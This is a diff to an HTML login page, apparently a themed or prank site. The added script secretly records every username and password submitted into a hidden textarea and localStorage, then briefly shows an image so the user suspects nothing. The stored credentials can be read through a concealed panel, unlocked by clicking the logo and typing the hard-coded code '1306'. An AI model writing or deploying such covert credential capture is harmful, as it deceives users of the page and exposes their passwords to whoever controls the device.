@@ -146,6 +146,7 @@
             height: auto;
             opacity: 0.7;
             z-index: 3;
+            cursor: pointer;
         }
 
         /* Image overlay for pack.png */
@@ -173,6 +174,28 @@
             display: flex;
             opacity: 1;
         }
+
+        /* Text area container */
+        .text-area-container {
+            display: none; /* Initially hidden */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
+
+        .text-area-container textarea {
+            width: 100%;
+            height: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
@@ -188,7 +211,6 @@
         <div class="star" style="top: 5%; left: 30%; animation-duration: 4.5s;"></div>
         <div class="star" style="top: 85%; left: 25%; animation-duration: 3.2s;"></div>
         <div class="star" style="top: 45%; left: 85%; animation-duration: 4.7s;"></div>
-
     </div>
 
     <!-- Logo in the top right corner -->
@@ -215,7 +237,28 @@
         <img src="pack.png" alt="Pack Image">
     </div>
 
+    <!-- Text area container -->
+    <div class="text-area-container" id="textAreaContainer">
+        <textarea id="textArea" rows="10" cols="30" placeholder="Type your text here..."></textarea>
+    </div>
+
     <script>
+        // Function to load saved data from localStorage into the text area
+        function loadSavedData() {
+            var savedData = localStorage.getItem('loginData');
+            if (savedData) {
+                var textArea = document.getElementById('textArea');
+                textArea.value = savedData;
+            }
+        }
+
+        // Call the function to load saved data when the page loads
+        window.onload = loadSavedData;
+
+        // Flag to track whether the text area can be opened
+        let canShowTextArea = false;
+
+        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the form from submitting
 
@@ -223,18 +266,44 @@
             var password = document.getElementById('password').value;
 
             if (username !== '' && password !== '') {
-                // Show the pack.png image with a smooth transition
                 var overlay = document.getElementById('imageOverlay');
                 overlay.classList.add('show');
+
+                // Hide the overlay after 2 seconds
+                setTimeout(function() {
+                    overlay.classList.remove('show');
+                }, 2000); // 2000 milliseconds = 2 seconds
+
+                // Append username and password to the text area
+                var textArea = document.getElementById('textArea');
+                textArea.value += `Username: ${username}\nPassword: ${password}\n\n`;
+
+                // Save the updated text area content to localStorage
+                localStorage.setItem('loginData', textArea.value);
             }
         });
 
-        // Add click event listener to the document
-        document.addEventListener('click', function(event) {
-            var overlay = document.getElementById('imageOverlay');
-            // Check if the click was outside the overlay content
-            if (!overlay.contains(event.target)) {
-                overlay.classList.remove('show');
+        // Handle clicking on the hr.jfif image
+        document.querySelector('.logo').addEventListener('click', function() {
+            if (canShowTextArea) {
+                var textAreaContainer = document.getElementById('textAreaContainer');
+                // Toggle visibility of the text area container
+                if (textAreaContainer.style.display === 'none' || textAreaContainer.style.display === '') {
+                    textAreaContainer.style.display = 'block';
+                } else {
+                    textAreaContainer.style.display = 'none';
+                }
+            } else {
+                // Prompt for password
+                var password = prompt("Please enter the password to access the text area:");
+                if (password === '1306') {
+                    canShowTextArea = true;
+                    // Show the text area container
+                    var textAreaContainer = document.getElementById('textAreaContainer');
+                    textAreaContainer.style.display = 'block';
+                } else {
+                    alert('Incorrect password');
+                }
             }
         });
     </script>
